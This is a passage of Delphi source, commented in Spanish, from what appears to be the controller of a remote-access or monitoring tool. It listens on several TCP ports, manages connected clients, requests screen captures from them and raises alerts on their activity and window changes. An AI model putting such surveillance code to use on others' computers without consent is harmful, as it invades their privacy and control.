    Puertos := Puertos + ';';
  if not Escuchar2.Checked then
    begin
      while Pos(';', Puertos) > 0 do
        begin
          if o > 10 then break; //M�ximo 10 puertos
          Puerto := Copy(Puertos, 1, Pos(';', Puertos) - 1);
          Delete(Puertos, 1, Pos(';', Puertos));
          if ServerSockets[o] = nil then
            begin
              ServerSockets[o] := TIdTCPServer.Create(nil);
              ServerSockets[o].Active := False;
              ServerSockets[o].OnExecute := Serversocket.OnExecute;
              ServerSockets[o].OnConnect := Serversocket.OnConnect;
              ServerSockets[o].OnDisconnect := Serversocket.OnDisconnect;
              ServerSockets[o].ThreadMgr := IdThreadMgrDefault1;
            end;
          try
            ServerSockets[o].DefaultPort := StrToIntDef(Puerto, 80);
            if StrToIntDef(Puerto, -1) <> -1 then
              ServerSockets[o].Active := True;
            FormOpciones.EditPuerto.Enabled := False;
            Escuchar2.Caption := _('Detener');
            Escuchar1.Checked := True;
          except
            MessageDlg(_('El puerto ') + Puerto +
              _(' ya est� en uso o hay un firewall bloque�ndolo, elija otro'), mtWarning, [mbOK], 0);
          end;
          o := o + 1;
        end;

      Escuchar2.ImageIndex := 270;
      StatusBar.Panels[0].Text := _('Esperando conexiones');
      StatusBar.Panels[1].Text := _('Puerto(s): ') + FormOpciones.EditPuerto.Text;
      Escuchar2.Checked := true;
    end
  else
    begin {Dejar de escuchar en los puertos seleccionados}
      o := 0;
      while True do
        begin
          if o > 9 then break; //M�ximo 10 puertos
          if Serversockets[o] <> nil then
            begin
              if Serversockets[o].Active then
                begin
                  List := ServerSockets[o].Threads.LockList;
                  for i := 0 to List.Count - 1 do
                    begin
                      Athread := TidPeerThread(List.Items[i]);
                      if Athread.Connection.Connected then
                        begin
                          Athread.Suspend;
                          Athread.Connection.Disconnect;
                          Athread.FreeOnTerminate := True;
                          Athread.Terminate;
                          List[i] := nil;
                          Athread := nil;
                        end;
                    end;
                  ServerSockets[o].Threads.Clear;
                  ServerSockets[o].Threads.UnlockList;
                  ServerSockets[o].Active := False;
                  ServerSockets[o].Bindings.Clear;
                end;
              ServerSockets[o].Free;
              ServerSockets[o] := nil;
            end;
          o := o + 1;
        end;
      ListViewConexiones.Clear;
      FormOpciones.EditPuerto.Enabled := True;
      Escuchar2.Caption := _('Escuchar');
      Escuchar1.Checked := False;
      Escuchar2.ImageIndex := 268;
      StatusBar.Panels[0].Text := _('Escucha detenida');
      Escuchar2.Checked := false;
    end;

end;


procedure TFormMain.ImageDesktopClick(Sender: TObject);
begin
  Capturapantalla1Click(Sender);
end;

procedure TFormMain.SpeedButton1Click(Sender: TObject);
begin
  Abrir1Click(Sender);
end;

procedure TFormMain.ListViewConexionesSelectItem(Sender: TObject;
  Item: TListItem; Selected: Boolean);
var
  VentanaControl : TFormControl;
begin
  if (FormOpciones.CheckBoxCapturaInferior.Checked and FormOpciones.CheckBoxPanelInferior.Checked and (ListViewConexiones.Selected <> nil)) then
  begin
    VentanaControl := TFormControl(CrearVentanaControl(ListViewConexiones.Selected)); {Hay que generar el centro de control para recibir la captura :(}
    ConnectionWriteLn(TidPeerThread(ListViewConexiones.Selected.SubItems.Objects[0]), 'CAPSCREEN|70|' + IntToStr(ImageDesktop.Height) + '|');
  end;
  LabelInfo.Caption := IntToStr(ListViewConexiones.SelCount)+' Clientes seleccionados';
end;

procedure TFormMain.SpeedButtonAvisarActividadClick(Sender: TObject);
begin
VuelvaaaveractividadenelPC1Click(Sender);
end;

procedure TFormMain.SplitterMoved(Sender: TObject);
begin
  
  ListViewConexiones.OnSelectItem(Sender, nil, true);
end;

procedure TFormMain.SpeedButtonAvisarCambioVentanaClick(Sender: TObject);
begin
  Cambiedeventana1Click(Sender);
end;

procedure TFormMain.ServerSocketException(AThread: TIdPeerThread;
  AException: Exception);
begin
    AException := nil;
    AThread.Terminate;
end;

procedure TFormMain.SpeedButtonCarpetaUserClick(Sender: TObject);
begin
  Abrirdirectoriousuario1Click(Sender);
end;

end.

